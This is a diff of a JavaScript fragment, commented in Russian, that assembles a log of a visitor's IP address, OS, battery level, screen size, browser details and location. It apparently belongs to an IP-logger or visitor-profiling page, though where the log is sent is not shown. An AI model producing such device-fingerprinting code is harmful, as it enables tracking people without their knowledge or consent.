@@ -45,19 +45,24 @@
                             logData += `🖥️ Информация об устройстве:\n`;
                             logData += `├ IP: ${data.ip}\n`;
                             logData += `├ ОС: ${navigator.platform}\n`;
-                            logData += `├ Ядро OC: Linux\n`;
-                            logData += `├ Версия OC: 10\n`;
-                            logData += `├ Имя ОС: Win32\n`;
+
+                            // Получаем данные о батарее
+                            navigator.getBattery().then(battery => {
+                                logData += `├ Процент батареи: ${battery.level * 100}%\n`;
+                            }).catch(() => logData += `├ Процент батареи: Не доступен\n`);
+
+                            logData += `├ Ядро ОС: ${navigator.platform}\n`;
+                            logData += `├ Версия ОС: ${navigator.appVersion}\n`;
+                            logData += `├ Имя ОС: ${navigator.userAgent}\n`;
                             logData += `├ Тип устройства: Компьютер\n`;
                             logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
-                            logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n`;
-                            logData += `└ Процент батареи: 36%\n\n`;
+                            logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n\n`;
 
                             logData += `🌐 Информация о браузере:\n`;
                             logData += `├ UserAgent: ${navigator.userAgent}\n`;
-                            logData += `├ Название браузера: Netscape\n`;
-                            logData += `├ Версия браузера: (${navigator.appVersion})\n`;
-                            logData += `└ Тип движка браузера: Gecko\n\n`;
+                            logData += `├ Название браузера: ${navigator.appName}\n`;
+                            logData += `├ Версия браузера: ${navigator.appVersion}\n`;
+                            logData += `└ Тип движка браузера: ${navigator.product}\n\n`;
 
                             logData += `👻 Информация об IP:\n`;
                             logData += `├ Континент: Asia\n`;
